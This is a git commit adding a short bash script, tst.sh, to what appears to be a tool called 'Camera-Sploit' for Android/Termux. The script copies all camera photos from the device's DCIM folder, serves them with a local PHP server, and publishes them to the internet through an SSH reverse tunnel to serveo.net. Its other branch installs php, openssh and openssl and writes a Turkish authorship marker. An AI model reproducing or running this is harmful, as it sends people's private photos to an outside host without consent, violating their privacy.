df3198ff337d8433fba27a24addda2d271640876
yamanefkar <38867900+yamanefkar@users.noreply.github.com>
2019-08-09 15:55:44 +0300

    Add files via upload

---
+++ tst.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+random="YAMANEFkaRa"$RANDOM
+if [[ -e "Lib/ok.txt" ]]; then
+                cd Lib && rm -rf *.jpg
+                cd / && cd sdcard/DCIM/Camera && cp *.jpg $HOME/Camera-Sploit/Lib
+                cd $HOME/Camera-Sploit/Lib &&
+                php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+                sleep 3 &&
+                ssh -R 80:localhost:3333 $random@serveo.net
+        else
+                apt-get install php -y
+                apt install openssh -y
+                apt install openssl -y
+                cd Lib/ &&
+                echo "YamanEfkar Tarafından kodlandı." >> ok.txt
+                cd .. && bash tst.sh
+fi
